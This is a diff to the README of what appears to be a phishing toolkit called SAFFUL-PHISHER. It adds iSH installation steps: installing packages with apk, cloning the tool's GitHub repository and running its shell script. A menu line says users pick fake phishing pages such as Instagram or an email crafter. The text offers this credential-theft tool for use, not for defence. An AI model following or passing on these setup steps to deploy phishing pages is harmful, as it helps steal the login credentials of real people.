@@ -44,14 +44,28 @@ bash saffulphisher.sh
 That's it. The only file you need to run is `saffulphisher.sh`.
 
 ---
-
-## Usage
-
 Run:
 
 ```bash
 bash saffulphisher.sh
 ```
+---
+
+## Installation For ISH
+
+```bash
+apk update
+apk add git bash
+```
+then 
+```bash
+git clone https://github.com/godfada-sa/SAFFUL-PHISHER.git
+cd SAFFUL-PHISHER
+chmod +x saffulphisher.sh
+bash saffulphisher.sh
+```
+
+
 
 From the main menu, pick a phishing page (e.g. `01` for Instagram) or `E` for the email crafter.
 
